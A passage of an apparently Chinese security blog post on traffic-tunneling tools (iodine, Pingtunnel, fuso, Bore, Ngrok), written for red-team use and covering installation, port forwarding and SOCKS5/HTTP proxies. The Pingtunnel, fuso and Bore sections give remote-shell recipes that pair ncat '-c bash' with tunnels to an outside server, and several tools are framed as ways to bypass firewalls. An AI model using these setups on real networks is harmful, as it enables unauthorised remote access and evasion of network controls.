class="line">-f保持在前台运行</span><br><span class="line"></span><br><span class="line">-D增加调试级别  (在<span class="variable constant_">UTF</span>-<span class="number">8</span>终端使用-<span class="attr">DD</span>: <span class="string">&quot;LC_ALL=C luit碘化-DD…&quot;</span>)</span><br><span class="line"></span><br><span class="line">-u name删除权限并以用户name运行</span><br><span class="line"></span><br><span class="line">-t dir to chroot to dir目录</span><br><span class="line"></span><br><span class="line">-d device设置隧道设备名称</span><br><span class="line"></span><br><span class="line">-m mtu设置隧道设备的mtu</span><br><span class="line"></span><br><span class="line">-z context用于初始化后应用<span class="title class_">SELinux</span>上下文</span><br><span class="line"></span><br><span class="line">-l监听传入dns流量的<span class="title class_">IPv4</span>地址(默认<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>) (使用“外部”只监听外部<span class="variable constant_">IP</span>，通过服务查找)</span><br><span class="line"></span><br><span class="line">-L用于侦听传入dns流量的<span class="title class_">IPv6</span>地址(默认::)</span><br><span class="line"></span><br><span class="line">-p监听传入<span class="variable constant_">DNS</span>流量的端口(默认为<span class="number">53</span>)</span><br><span class="line"></span><br><span class="line">-n ip以响应<span class="variable constant_">NS</span>查询 (使用“auto”使用外部<span class="variable constant_">IP</span>，通过服务查找)</span><br><span class="line"></span><br><span class="line">-b端口转发正常的<span class="variable constant_">DNS</span>查询(在本地主机上)</span><br><span class="line"></span><br><span class="line">-P用于身份验证的-P密码(最多使用<span class="number">32</span>个字符)</span><br><span class="line"></span><br><span class="line">-F pidfile将pid写入文件</span><br><span class="line"></span><br><span class="line">-i关闭前的最大空闲时间</span><br><span class="line"></span><br><span class="line">**iodine 客户端：**</span><br><span class="line">-<span class="number">4</span>只连接<span class="title class_">IPv4</span></span><br><span class="line"></span><br><span class="line">-<span class="number">6</span>只连接<span class="title class_">IPv6</span></span><br><span class="line"></span><br><span class="line">-T force dns <span class="attr">type</span>: <span class="variable constant_">NULL</span>, <span class="variable constant_">PRIVATE</span>, <span class="variable constant_">TXT</span>, <span class="variable constant_">SRV</span>, <span class="variable constant_">MX</span>, <span class="variable constant_">CNAME</span>, <span class="title function_">A</span>(默认值:autodetect)</span><br><span class="line"></span><br><span class="line">-O 强制下游编码-T除<span class="attr">NULL</span>: <span class="title class_">Base32</span>, <span class="title class_">Base64</span>, <span class="title class_">Base64</span>u，<span class="title class_">Base128</span>，或(仅限<span class="attr">TXT</span>:) <span class="title class_">Raw</span>(默认值:autodetect)</span><br><span class="line"></span><br><span class="line">-I 最大请求间隔(默认<span class="number">4</span>秒)，以防止<span class="variable constant_">DNS</span>超时</span><br><span class="line"></span><br><span class="line">-L <span class="number">1</span>:使用延迟模式低延迟(默认)。<span class="number">0</span>:不(暗示- <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">-m 下行分片的最大大小(默认为autodetect)</span><br><span class="line"></span><br><span class="line">-M 上游主机名的最大大小(~<span class="number">100</span>-<span class="number">255</span>，默认值:<span class="number">255</span>)</span><br><span class="line"></span><br><span class="line">-r 跳过原始<span class="variable constant_">UDP</span>模式的尝试</span><br><span class="line"></span><br><span class="line">-P 用于身份验证的-P密码(最多使用<span class="number">32</span>个字符)</span><br><span class="line"></span><br><span class="line">其他选项:</span><br><span class="line"></span><br><span class="line">-v打印版本信息并退出</span><br><span class="line"></span><br><span class="line">-h打印帮助并退出</span><br><span class="line"></span><br><span class="line">-f保持在前台运行</span><br><span class="line"></span><br><span class="line">-u name删除权限并以用户name运行</span><br><span class="line"></span><br><span class="line">-t dir to chroot to dir目录</span><br><span class="line"></span><br><span class="line">-d device设置隧道设备名称</span><br><span class="line"></span><br><span class="line">-z context，用于初始化后应用指定的<span class="title class_">SELinux</span>上下文</span><br><span class="line"></span><br><span class="line">-F pidfile将pid写入文件</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Pingtunnel"><a href="#Pingtunnel" class="headerlink" title="Pingtunnel"></a>Pingtunnel</h2><aside>
📢 Ping隧道是一种通过ICMP发送TCP/UDP流量的工具。
通过伪造ping，把tcp/udp/sock5流量通过远程服务器转发到目的服务器上。用于突破某些运营商封锁TCP/UDP流量。

<p>项目地址：<a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a></p>
</aside>

<blockquote>
<p>功能</p>
</blockquote>
<ul>
<li>建立 ping （icmp）隧道</li>
<li>绕过防火墙网络限制</li>
</ul>
<blockquote>
<p>安装</p>
</blockquote>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">安装:<span class="attr">https</span>:<span class="comment">//github.com/esrrhs/pingtunnel</span></span><br><span class="line">或者使用包管理器：apt,pacman,brew</span><br></pre></td></tr></table></figure>

<blockquote>
<p>使用</p>
</blockquote>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">建立 socks5隧道</span><br><span class="line">服务器端</span><br><span class="line">sudo pingtunnel -type server  -key <span class="number">123456</span> -nolog <span class="number">1</span> -noprint <span class="number">1</span></span><br><span class="line"></span><br><span class="line">客户端</span><br><span class="line">建立 socks5 隧道，会在客户端监听<span class="number">8090</span>为socks5隧道与服务器端通信，使用icmp协议</span><br><span class="line">sudo pingtunnel -type client -l :<span class="number">8090</span> -s 服务器端ip  -key <span class="number">123456</span> -sock5 <span class="number">1</span>  -nolog <span class="number">1</span> -noprint <span class="number">1</span></span><br><span class="line"></span><br><span class="line">建立 http 隧道</span><br><span class="line">服务器端</span><br><span class="line">sudo pingtunnel -type server  -key <span class="number">123456</span> -nolog <span class="number">1</span> -noprint <span class="number">1</span></span><br><span class="line">并且在服务器端监听一个 http 隧道 使用文章中提到的 glider</span><br><span class="line">glider -listen <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>：<span class="number">8090</span> </span><br><span class="line"></span><br><span class="line">客户端</span><br><span class="line">客户端与服务端连接，并且将本地的<span class="number">8090</span>端口的流量发送到服务器端的 <span class="number">8090</span>端口，服务器端<span class="number">8090</span>为http隧道。使用icmp协议建立隧道</span><br><span class="line">sudo pingtunnel -type client -l :<span class="number">8090</span> -s 服务器端ip -t <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8090</span>  -key <span class="number">123456</span> -tcp <span class="number">1</span>  -nolog <span class="number">1</span> -noprint <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="variable constant_">UDP</span> 转发</span><br><span class="line">sudo pingtunnel -type client -l :<span class="number">8090</span> -s 服务器端ip -t 服务器端<span class="attr">ip</span>:<span class="number">4455</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>上线 shell</li>
</ul>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">服务器端</span><br><span class="line">sudo pingtunnel -type server  -key <span class="number">123456</span> -nolog <span class="number">1</span> -noprint <span class="number">1</span></span><br><span class="line">ncat -vnlp <span class="number">8090</span> -k </span><br><span class="line">服务器端使用pingtunnel 建立icmp服务端，随后使用ncat 监听一个端口，等待客户端ncat连接。</span><br><span class="line"></span><br><span class="line">客户端</span><br><span class="line">sudo pingtunnel -type client -l :<span class="number">8090</span> -s <span class="number">139.180</span><span class="number">.189</span><span class="number">.48</span> -t <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8090</span>  -key <span class="number">123456</span> -tcp <span class="number">1</span>  -nolog <span class="number">1</span> -noprint <span class="number">1</span></span><br><span class="line">ncat -vn <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">8090</span>  -c bash  </span><br><span class="line">客户端连接上服务器端的icmp隧道，使用ncat连接<span class="number">8090.</span>开启bash。服务器端ncat会受到请求。可直接执行命令。</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="fuso"><a href="#fuso" class="headerlink" title="fuso"></a>fuso</h2><aside>
📢 一款体积小, 快速, 稳定, 高效, 轻量的内网穿透, 端口转发工具 支持多连接,级联代理,传输加密。

<p>项目地址：<a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/editso/fuso">https://github.com/editso/fuso</a></p>
</aside>

<blockquote>
<p>功能</p>
</blockquote>
<ul>
<li>端口转发</li>
<li>socks5 代理</li>
<li>加密压缩传输</li>
<li>级联代理</li>
<li>kcp 支持</li>
</ul>
<blockquote>
<p>安装</p>
</blockquote>
<ul>
<li><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/editso/fuso/releases">https://github.com/editso/fuso/releases</a></li>
<li>下载对应系统架构版本的包。</li>
<li>服务端使用fus，客户端使用fuc。</li>
</ul>
<blockquote>
<p>使用</p>
</blockquote>
<ul>
<li>端口转发</li>
</ul>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">**服务端**</span><br><span class="line">服务端监听 <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>（所有ip,默认），监听<span class="number">6767</span>端口，开启socks,开启udp转发。</span><br><span class="line">sudo ./fus -l <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>  -p <span class="number">6767</span> --enable-socks <span class="literal">true</span> --enable-ufd <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">**客户端**</span><br><span class="line">客户端指定连接ip（服务器ip），指定服务器端口，指定转发的本地ip地址<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> ，和本地端口<span class="number">8090</span>,指定映射在服务器端的端口为<span class="number">8090</span></span><br><span class="line">sudo ./fuc <span class="number">139.180</span><span class="number">.189</span><span class="number">.48</span> <span class="number">6767</span> --forward-host <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>  --forward-port <span class="number">8090</span> --visit-bind-port <span class="number">8090</span></span><br><span class="line"></span><br><span class="line">随后在服务器端，访问服务器本地的<span class="number">8090</span>就相当于访问客户端的转发端口，<span class="number">8090</span>。可以设置转发绑定在本地端口的任何服务。如ssh，隧道等等。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">**利用映射端口配合 ncat 反弹shell**</span><br><span class="line"></span><br><span class="line">客户端执行 ncat -vnlp <span class="number">8090</span> -c bash</span><br><span class="line">服务端执行 ncat -vn <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">8090</span></span><br></pre></td></tr></table></figure>

<ul>
<li>官方 socks5 隧道支持</li>
</ul>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">服务端</span><br><span class="line">sudo ./fus -l <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>  -p <span class="number">6767</span> --enable-socks <span class="literal">true</span> --enable-ufd <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">客户端</span><br><span class="line">开启socks 开启socks udp ，设置账号，密码。</span><br><span class="line">sudo ./fuc <span class="number">139.180</span><span class="number">.189</span><span class="number">.48</span> <span class="number">6767</span> --forward-host <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>  --socks --socks-udp --socks-username admin --socks-password passwd  --visit-bind-port <span class="number">8090</span></span><br><span class="line"></span><br><span class="line">服务器端配置 socks5 隧道就可以使用客户端网络连接。</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Bore"><a href="#Bore" class="headerlink" title="Bore"></a>Bore</h2><aside>
📢 Rust 中的一个现代、简单的TCP隧道，将本地端口暴露给远程服务器，绕过标准的NAT连接防火墙。
官方维护了公共服务器，可不自建服务器进行测试。

<p>项目地址：<a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/ekzhang/bore">https://github.com/ekzhang/bore</a></p>
</aside>

<blockquote>
<p>安装</p>
</blockquote>
<ul>
<li><code>cargo install bore-cli</code></li>
<li><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/ekzhang/bore/releases">https://github.com/ekzhang/bore/releases</a></li>
<li>或使用包管理器：apt ，pacman ，brew 等等。</li>
</ul>
<blockquote>
<p>功能</p>
</blockquote>
<ul>
<li>内网穿透</li>
<li>端口转发</li>
<li>流量隧道</li>
</ul>
<blockquote>
<p>使用</p>
</blockquote>
<ul>
<li>端口转发</li>
</ul>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">服务端</span><br><span class="line">bore server  -s passwd</span><br><span class="line">执行后开启服务，设置密码，服务会监听到<span class="number">7835</span>端口</span><br><span class="line"></span><br><span class="line">客户端</span><br><span class="line">bore local -l <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">8090</span> -t 服务器ip -p <span class="number">8090</span>  -s passwd</span><br><span class="line">执行后将本地<span class="number">8090</span>端口转发到服务器的<span class="number">8090</span> 端口。</span><br><span class="line"></span><br><span class="line">可以转发所有服务，例如 ssh,socks5隧道，http隧道等等。</span><br></pre></td></tr></table></figure>

<ul>
<li>流量隧道</li>
</ul>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http / socks5 隧道</span><br><span class="line">客户端使用文章中提到glider 监听隧道</span><br><span class="line">glider -listen :<span class="number">8090</span> -verbose </span><br><span class="line">bore local -l <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">8090</span> -t 服务器ip -p <span class="number">8090</span>  -s passwd</span><br><span class="line"></span><br><span class="line">服务端配置后可实现连接内网客户端隧道。</span><br><span class="line">bore server  -s passwd</span><br><span class="line">随后配置<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">8090</span> 为socks5 或者 http 隧道。</span><br></pre></td></tr></table></figure>

<ul>
<li>远程 shell</li>
</ul>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">客户端</span><br><span class="line">ncat -vnlp <span class="number">8090</span> -c bash</span><br><span class="line">bore local -l <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">8090</span> -t 服务器ip -p <span class="number">8090</span>  -s passwd</span><br><span class="line"></span><br><span class="line">服务端</span><br><span class="line">ncat -vn <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">8090</span></span><br><span class="line">bore server  -s passwd</span><br><span class="line"></span><br><span class="line">通过ncat 建立shell。通过 bore 进行流量隧道转发。</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a target="_blank" rel="noopener external nofollow noreferrer" href="http://bore.pub/">bore.pub</a></p>
</blockquote>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">官方托管了一个公共服务器 bore.<span class="property">pub</span> ，可以直接指定为服务器进行连接。</span><br><span class="line"></span><br><span class="line">例如：</span><br><span class="line">将本地<span class="number">8090</span>,转发到 bore.<span class="property">pub</span> 的<span class="number">8090</span></span><br><span class="line">bore local -l <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">8090</span> -t bore.<span class="property">pub</span> -p <span class="number">8090</span></span><br><span class="line"></span><br><span class="line">不指定端口号的话会随机在bore.<span class="property">pub</span>上连接一个端口。</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Ngrok"><a href="#Ngrok" class="headerlink" title="Ngrok"></a>Ngrok</h2><aside>
📌 NGROK 是一种全球分布式反向代理，可保护和加速应用程序和网络服务，无论在何处运行它们。可以将 ngrok 视为应用程序的前门。NGROK 是一个统一的入口平台，因为它将所有组件组合在一起，将流量从服务传递到 Internet 中。ngrok 将反向代理、负载均衡器、API 网关、防火墙、交付网络、DDoS 防护等整合在一起。

<p>🗯️ 无需自建服务器，直接连接官方服务器。</p>
<p>官网：<a target="_blank" rel="noopener external nofollow noreferrer" href="https://ngrok.com/">https://ngrok.com/</a><br>官方文档：<a target="_blank" rel="noopener external nofollow noreferrer" href="https://ngrok.com/docs/">https://ngrok.com/docs/</a></p>
</aside>

<blockquote>
<p>功能</p>
</blockquote>
<ul>
<li>反向代理</li>
<li>内网穿透</li>
<li>端口转发</li>
<li>流量隧道</li>
</ul>
<blockquote>
<p>安装</p>
</blockquote>
<ul>
<li><code>brew install ngrok/ngrok/ngrok</code></li>
<li><code>yay -S aur/ngrok</code></li>
<li><code>choco install ngrok</code></li>
<li><code>apt install ngrok</code></li>
</ul>
<blockquote>
<p>基本使用</p>
</blockquote>
<ul>
<li>登陆官网</li>
<li>注册账户</li>
<li><code>ngrok config add-authtoken &lt;TOKEN&gt;</code>  指定token连接</li>
<li><code>ngrok http http://localhost:8080</code> 启动，将本地8080 端口转发到ngrok 官方服务器。执行后会显示随机分配的域名地址。</li>
<li><code>ngrok http http://localhost:8080 --oauth=google --oauth-allow-email=alan@example.com</code>  添加google 认证，防止任何人都能访问。</li>
<li><code>ngrok http [http://localhost:8080](http://localhost:8080/) --basic-auth &#39;username:passwd12345678&#39;</code>  添加账户密码基本身份认证，：分割账号密码。</li>
<li><code>ngrok http [file:///var/log](file:///var/log)</code>  开启一个http文件服务，类似与 <code>pythom -m http.server</code></li>
<li><code>ngrok tcp 22</code>   使用 tcp 协议转发22端口，ssh服务。或者使用3389等公开rdp，公开vnc等等。</li>
</ul>
<hr>
<h1 id="Over-。-。-。☺️"><a href="#Over-。-。-。☺️" class="headerlink" title="Over 。 。 。☺️"></a>Over 。 。 。☺️</h1><h1 id="Over-。-。-。☺️-1"><a href="#Over-。-。-。☺️-1" class="headerlink" title="Over 。 。 。☺️"></a>Over 。 。 。☺️</h1><h1 id="Over-。-。-。☺️-2"><a href="#Over-。-。-。☺️-2" class="headerlink" title="Over 。 。 。☺️"></a>Over 。 。 。☺️</h1><h1 id="Over-。-。-。☺️-3"><a href="#Over-。-。-。☺️-3" class="headerlink" title="Over 。 。 。☺️"></a>Over 。 。 。☺️</h1><h1 id="Over-。-。-。☺️-4"><a href="#Over-。-。-。☺️-4" class="headerlink" title="Over 。 。 。☺️"></a>Over 。 。 。☺️</h1></div></div></div>

<div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>啊，再见了，再见了，哈</p>
</div>

<div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>我们会再见的对么</p>
</div>

<div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>再见你要幸福</p>
</div>

<div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>燕子，燕子</p>
</div>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://0a00.github.io">方糖</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://0a00.github.io/2024/02/20/%E6%B5%81%E9%87%8F%E9%9A%A7%E9%81%93/">https://0a00.github.io/2024/02/20/%E6%B5%81%E9%87%8F%E9%9A%A7%E9%81%93/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://0a00.github.io" target="_blank">方糖</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B5%81%E9%87%8F%E9%9A%A7%E9%81%93/">流量隧道</a></div><div class="post_share"><div class="social-share" data-image="/imgs/bg.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/imgs/wx.png" target="_blank"><img class="post-qr-code-img" src="/imgs/wx.png" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/imgs/zfb.jpg" target="_blank"><img class="post-qr-code-img" src="/imgs/zfb.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/11/26/401-and-403-Bypass/" title="401-and-403-Bypass 手册"><img class="cover" src="/imgs/bg.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">401-and-403-Bypass 手册</div></div></a></div><div class="next-post pull-right"><a href="/2024/02/20/Python-%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86/" title="Python 项目管理"><img class="cover" src="/imgs/bg.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Python 项目管理</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/imgs/gt.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">方糖</div><div class="author-info__description">嘿嘿 呼呼 嘻嘻 哈哈</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">30</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">24</div></a></div><a id="card-info-btn" target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/0a00"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="/rss2.xml" target="_blank" title="RSS订阅"><i class="fas fa-solid fa-rss" style="color: #ffaa00;"></i></a><a class="social-icon" href="/sitemap.xml" target="_blank" title="站点地图"><i class="fas fa-solid fa-sitemap" style="color: #aaaa7f;"></i></a><a class="social-icon" href="mailto:xxxxxx@gmail.com" rel="external nofollow noreferrer" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #6673c6;"></i></a><a class="social-icon" href="https://github.com/0a00" rel="external nofollow noreferrer" target="_blank" title="Github"><i class="fab fa-github" style="color: #aa557f;"></i></a><a class="social-icon" href="https://mp.weixin.qq.com/mp/profile_ext?action=home&amp;__biz=Mzk0NDQwMDY1Nw==&amp;scene=110==#wechat_redirect" rel="external nofollow noreferrer" target="_blank" title="微信公众号"><i class="fa-brands fa-weixin" style="color: #7bb65b;"></i></a><a class="social-icon" href="https://music.163.com/#/user/home?id=1364059112" rel="external nofollow noreferrer" target="_blank" title="网易云"><i class="fas fa-solid fa-music" style="color: #ff0000;"></i></a><a class="social-icon" href="https://0a00.github.io/" target="_blank" title="mac"><i class="fas fa-brands fa-apple" style="color: #55aaff;"></i></a><a class="social-icon" href="https://0a00.github.io/" target="_blank" title="linux"><i class="fas fa-brands fa-linux" style="color: #ffaaff;"></i></a><a class="social-icon" href="https://0a00.github.io/" target="_blank" title="windowss"><i class="fa-brands fa-windows" style="color: #35a0a0;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">满怀热爱 勇往直前</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%F0%9F%90%B8-%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">🐸 简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E6%B5%81%E9%87%8F%E9%9A%A7%E9%81%93-%F0%9F%8C%B5"><span class="toc-number">1.1.</span> <span class="toc-text">关于流量隧道 🌵</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%B5%81%E9%87%8F%E9%9A%A7%E9%81%93%E7%9A%84%E6%84%8F%E4%B9%89-%E2%9C%8D%EF%B8%8F"><span class="toc-number">1.2.</span> <span class="toc-text">使用流量隧道的意义 ✍️</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9%E4%BA%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%BA%A2%E9%98%9F-%F0%9F%91%A8%E2%80%8D%F0%9F%8F%AD"><span class="toc-number">1.3.</span> <span class="toc-text">对于渗透测试红队 👨‍🏭</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86"><span class="toc-number">1.4.</span> <span class="toc-text">正向代理反向代理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0"><span class="toc-number">2.</span> <span class="toc-text">实现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Frp"><span class="toc-number">2.1.</span> <span class="toc-text">Frp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85"><span class="toc-number">2.1.1.</span> <span class="toc-text">安装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3"><span class="toc-number">2.1.2.</span> <span class="toc-text">参数详解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">2.1.3.</span> <span class="toc-text">常用方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Nps"><span class="toc-number">2.2.</span> <span class="toc-text">Nps</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%98%E5%8C%96"><span class="toc-number">2.2.1.</span> <span class="toc-text">优化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stowaway"><span class="toc-number">2.3.</span> <span class="toc-text">Stowaway</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Venom"><span class="toc-number">2.4.</span> <span class="toc-text">Venom</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#proxychains-ng"><span class="toc-number">2.5.</span> <span class="toc-text">proxychains-ng</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Glider"><span class="toc-number">2.6.</span> <span class="toc-text">Glider</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gost-v3"><span class="toc-number">2.7.</span> <span class="toc-text">Gost v3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Udp2raw"><span class="toc-number">2.8.</span> <span class="toc-text">Udp2raw</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Rathole"><span class="toc-number">2.9.</span> <span class="toc-text">Rathole</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#iodine"><span class="toc-number">2.10.</span> <span class="toc-text">iodine</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pingtunnel"><span class="toc-number">2.11.</span> <span class="toc-text">Pingtunnel</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fuso"><span class="toc-number">2.12.</span> <span class="toc-text">fuso</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bore"><span class="toc-number">2.13.</span> <span class="toc-text">Bore</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ngrok"><span class="toc-number">2.14.</span> <span class="toc-text">Ngrok</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Over-%E3%80%82-%E3%80%82-%E3%80%82%E2%98%BA%EF%B8%8F"><span class="toc-number">3.</span> <span class="toc-text">Over 。 。 。☺️</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" 